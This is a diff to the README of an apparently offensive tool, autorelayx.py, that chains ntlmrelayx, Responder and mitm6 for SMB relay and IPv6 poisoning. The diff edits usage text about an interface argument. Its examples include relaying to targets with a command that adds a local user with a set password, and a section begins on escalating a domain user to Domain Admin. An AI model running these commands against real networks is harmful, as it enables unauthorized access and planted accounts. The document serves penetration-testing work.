@@ -29,15 +29,15 @@ Runs ntlmrelayx.py and Responder.
 
 ```python autorelayx.py -l <hostlist.txt>```
 
-SMB relay with a custom command and without checking SMB signing and using a specific interface for Responder and mitm6.
+SMB relay with a custom command and without checking SMB signing.
 
-```python autorelayx.py -tf <targets_file.txt> -c <"net user /add danmcinerney P@ssword123456"> -i <eth0>```
+```python autorelayx.py -tf <targets_file.txt> -c <"net user /add danmcinerney P@ssword123456">```
 
 ## IPv6 poisoning
-This will run ntlmrelayx, Responder, and mitm6. It is suggested to use the -d <domain> argument to limit mitm6's 
-responses.
+This will run ntlmrelayx, Responder, and mitm6. The -i argument is optional and specifies the interface to use for both 
+Responder and mitm6. It is optional but suggested to use the -d <domain> argument to limit mitm6's responses.
 
-```python autorelayx.py -l <hostlist.txt> -6 -d <domain for mitm6 to poison>```
+```python autorelayx.py -l <hostlist.txt> -6 -d <domain for mitm6 to poison> -i <interface>```
 
 ## Drop the Mic
 Escalate a domain user that you have the password for to Domain Admin. Script will test the exchange server(s) for 
